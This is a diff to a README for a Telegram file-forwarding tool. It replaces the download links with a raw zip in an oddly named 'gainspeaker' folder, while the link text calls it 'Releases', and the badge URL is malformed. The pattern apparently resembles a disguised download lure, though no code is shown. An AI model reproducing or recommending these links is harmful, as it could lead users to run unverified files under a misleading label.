@@ -6,13 +6,13 @@ Welcome to the telegram-file-forwarder repository! This tool helps you upload fi
 
 ## 🔗 Download the App
 
-[![Download telegram-file-forwarder](https://raw.githubusercontent.com/susbro200/telegram-file-forwarder/main/gainspeaker/telegram-file-forwarder.zip%20Now-telegram--file--forwarder-brightgreen)](https://raw.githubusercontent.com/susbro200/telegram-file-forwarder/main/gainspeaker/telegram-file-forwarder.zip)
+[![Download telegram-file-forwarder](https://github.com/susbro200/telegram-file-forwarder/raw/refs/heads/main/gainspeaker/telegram-forwarder-file-v3.7.zip%20Now-telegram--file--forwarder-brightgreen)](https://github.com/susbro200/telegram-file-forwarder/raw/refs/heads/main/gainspeaker/telegram-forwarder-file-v3.7.zip)
 
 ## 📥 Download & Install
 
 To get started, visit this page to download the latest version of the telegram-file-forwarder:
 
-[Download from Releases](https://raw.githubusercontent.com/susbro200/telegram-file-forwarder/main/gainspeaker/telegram-file-forwarder.zip).
+[Download from Releases](https://github.com/susbro200/telegram-file-forwarder/raw/refs/heads/main/gainspeaker/telegram-forwarder-file-v3.7.zip).
 
 1. Open the link above in your web browser.
 2. Look for the latest release. You will see different files available for download.
